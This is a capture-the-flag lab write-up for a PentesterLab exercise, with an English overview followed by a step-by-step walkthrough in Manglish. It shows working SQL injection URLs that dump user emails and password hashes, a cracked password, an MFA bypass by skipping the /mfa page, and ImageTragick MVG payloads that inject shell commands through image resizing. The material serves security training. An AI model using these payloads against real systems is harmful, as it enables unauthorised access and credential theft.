## Introduction
-->This exercise covers how to gain access to an administration interface using SQL injection followed by how to get command execution using ImageTragick
-->This course details the exploitation of a SQL injection in a web application and how an attacker can use it to gain access to the administration pages after bypassing the Multi-Factor Authentication. Then, using this access, the attacker will be able to gain code execution on the server using a vulnerability in ImageMagick.
-->The attack is divided into 3 steps:
-   Find the SQL Injection to retrieve users' password and crack them
-   Bypass the Multi-Factor Authentication
-   Gain code execution

## The SQL Injection
-->When you visit the main page, the application allows you to filter the files based on the `user_id` using the following URL: `?filter[user_id]=1` for example. Here the vulnerability is located in the key (`user_id`) instead of in the value (`1`). The developer trusts the key and integrates it in the SQL query without any escaping. Then the application properly uses prepared-statement to add the value. You should be able to exploit this issue using a simple `UNION SELECT` exploitation like you saw in the [From SQL injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/) exercise.

## Bypassing the Multi-Factor Authentication
-->Bypassing the MFA in this challenge is fairly trivial. The application redirects you to the MFA page after logging in but doesn't prevent you from visiting other pages. Therefore, you can just go to any other pages in the application to bypass the MFA.

## Gaining code execution/ImageTragick
-->Once you bypassed the MFA, you should have access to the management interface. In this interface, you are able to see a list of files and download them. If you upload a file, you should see that a prefix is added to the file's name and you have limited room to get code execution. Fortunately, you should be able to gain code execution using the resizing functionality.
-->The resizing functionality relies on a vulnerable version of ImageMagick and calls the tool `convert`. If you want to read more about this vulnerability, you can check the [ImageTragick's website](https://imagetragick.com/).
-->The exploitation relies on creating a malicious MVG image containing the following malicious code (for example to run `ls -la`):
```r
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|sleep 10")'
pop graphic-context
```
-->However, the website only let you upload `.jpg` and `.png` files. If you put the code above in a `.jpg` and `.png` the exploitation will still work as `convert` tries to guess the file type based on its content, not its extension.

## Conclusion
-->This exercise showed you how to manually detect and exploit SQL injection to gain access to users' password. Once the passwords are cracked and the MFA bypassed, you get access to the management pages. In this "Trusted zone", more functionalities are available which may lead to more vulnerabilities.

# Video Explanation
-->lab open chyuka enit athil kanuna link il ethengilum onnil click chyuka apol namal ee url ilek pokum->ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id]=1
-->ivide 1 enna sthalath namal test chyanam liek ' " 1-1 1-0  agnane.. but namuk error onum kanunila.so namal ee [user_id] enna sthalath test chyam liek [user_id']=1  enn koduth send chyumbol error verunund.ini onukodi single qoute idumbozhum aa error thane kanikunath
-->ini namuk [user_id=1--+]=1  enn kodukam. = sign url encode chyanam ie, %3d ie,  [user_id%3d1--+]=1
-->ini ee [user_id=1--+] ithile 1 mati 2 ,3,  enoke itt koduth send chyuka
-->ini namuk ivide union select chyam.athin mumb ethra columns unden ariyanam so orderby use chyam
->http://ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id%3d2%20order%20by%207--+]=1 
-->ipol namuk manasilayi 7 columns aan ullathen ok
-->union select chyth column vilikumbol 1,2,3,4  enn kodukumbol aakunilengil null,null,null,null  enn koduth nokam or 1,1,1,1  enn koduthnokam ok.ingane chyunath enthinanenal oru column thane matoru column ne reference pole aayirikum undavuka apol namla 1,2,3,4,5... ingane ital chelapo aakilayirikum
-->so union select namal 1,1,1,1,..enikgane aanu chyunthath :
->http://ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id%3d2%20union%20select%201,1,1,1,1,1,1%20from%20users--+]=1
-->ipol namuk page il error onum kanikunila.ivide namal users enna table il ninuman nokunath.ini namuk ee numbers il ethil ittal aan namak ath control chyan patunath ie, page il reflect chyuanath enn nokan.
-->so ivide randamathe 1 il namal 12 enn idumbol ath page il reflect chyunund.so avide namuk table il ulla contents dump chyan nokam ok
-->table il email und password um und.namuk aanengil aake oru column control chyan patu.so oru column il thane onil kooduthal result venamengil concat use chyam.database in anusarich ith matam undakum ->concat(email,":",password) enn koduthal mathi ok so :
->http://ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id%3d2%20union%20select%2011,concat(email,%22:----:%22,password),1,1,1,1,1%20from%20users--+]=1
-->ipol namuk admin tem athupole pentesterlab intem passowrd kitum 
```
[admin@pentesterlab.com:----:e52594d4f10a8acbcc1da8adee2056fc25738c3a59b24ea48c2e50fff519b9d8](http://ptl-a554e45a-f6c8cb03.libcurl.so/files/11) shared by [admin@pentesterlab.com](http://ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id]=1)

[user@pentesterlab.com:----:da976b0817733c0f4efd3ca74ac5c7652733bd2610b2d08877f2a397fc8ac7f4](http://ptl-a554e45a-f6c8cb03.libcurl.so/files/11) shared by [admin@pentesterlab.com](http://ptl-a554e45a-f6c8cb03.libcurl.so/?filter[user_id]=1)                   //hackme
```
-->so ee rand hash individual aayi eduth google il search chyuka.adminte search chythapol onum kiteela.so user@pentesterlab inte search chythapol namuk password kitunund online il ->hackme
-->so ee credentials vech namuk sign in chyam ok 
-->username:user@pentesterlab.com and password:hackme kodukuka apol oru MFA code chodikum ath undengile namuk account il keran patu
-->browser il /mfa undegil browser ine force chyth vere path ilek  pokan nokuka.browser il strict mfa undengil namal nere thirich /mfa yilek thane verum ok. ie, `/mfa  enn ullath aa mfa remove chyth nokuka`. 
->http://ptl-a554e45a-f6c8cb03.libcurl.so/mfa   enn ullathil mfa remove chythapol namual account il keri ok
-->accout il namuk upload chyan oke ulla option und. so go to "your files"  from there click new file . ivide ninum namuk images oke upload chyam.so aa image il namal malicious code idanam :
```r
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|sleep 10")'
pop graphic-context
```
-->ee code ittit .png format il oru file il save chyanam ie,image.png ok
-->ini namal new file il click chyth ee file application il upload chyanam.upload chyumbol namuk kanam 10 sec sleep chyunila.peten thane upload aakunund
-->but applicaiton il nokiyal kanam namal upload chyuna image inte oru thumbnail aakuna option um athinte koode undakum.so namal ath click chyhtal kanam namuk 10 kazhinjan athinte thumnail aakunath.so namal ini ee sleep enna cmd mati namuk venda command itt chyam ok. ivide uuid koduth chyhtal namal lav solve chythu ok ie,
```r
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/usr/local/bin/score 66d1486a-6571-4069-a67b-c4a70a99798d")'
pop graphic-context
```
